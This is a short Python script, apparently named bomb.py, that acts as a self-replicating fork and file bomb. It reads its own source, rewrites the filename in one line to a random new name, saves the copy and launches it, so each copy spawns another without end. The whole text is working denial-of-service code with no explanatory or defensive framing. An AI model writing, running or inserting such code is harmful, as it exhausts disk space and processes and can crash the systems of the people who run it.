from random import randrange
from subprocess import Popen
name = "a%010d.py"%randrange(0,100000000000)
l = open('bomb.py','r').read().split('\n')
l[3] = l[3][:10]+name[:-3]+l[3][l[3].index('.py'):]
open(name,'w').write('\n'.join(l))
Popen(['python',name])
